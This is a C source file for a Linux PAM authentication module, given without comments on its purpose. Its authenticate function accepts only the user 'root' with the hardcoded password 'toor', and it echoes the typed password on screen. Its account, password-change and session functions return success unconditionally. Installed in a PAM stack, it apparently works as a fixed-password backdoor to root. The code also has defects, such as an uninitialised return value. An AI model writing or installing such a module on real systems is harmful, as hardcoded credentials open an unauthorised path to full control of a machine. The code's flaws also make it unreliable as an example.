#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Authentication API's
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int, const char **argv)
{
    char *username, *passwd;
    char *secret_name = "root", *secret_passwd = "toor";

    struct pam_conv *conversation;
    struct pam_message message;
    struct pam_message *pmessage = &message;
    struct pam_response *res = NULL;

    int retval;

    pam_get_item(pamh, PAM_USER, (const void **)&username);

    pam_get_item(pamh, PAM_CONV, (void **)&conversation);

    message.msg_style = PAM_PROMPT_ECHO_ON;
    message.msg = username;
    if (conversation != NULL)
    {
        retval = conversation->conv(1, &pmessage, &res, conversation->appdata_ptr);
    }
    if (retval != PAM_SUCCESS)
    {
        printf("no passwd\n");
        return PAM_AUTH_ERR;
    }

    passwd = res->resp;

    if (strcmp(username, secret_name) == 0 && strcmp(passwd, secret_passwd) == 0)
    {
        passwd = NULL;
        if (res != NULL)
        {
            if (res->resp)
                free(res->resp);
            free(res);
        }

        return PAM_SUCCESS;
    }
    else
    {
        passwd = NULL;
        if (res != NULL)
        {
            if (res->resp)
                free(res->resp);
            free(res);
        }
        return PAM_AUTH_ERR;
    }
}

// Account Management API's
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}
// Password Management API's
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}
// Session Management API's
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int, const char **argv)
{
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int, const char **argv)
{
    return PAM_SUCCESS;
}
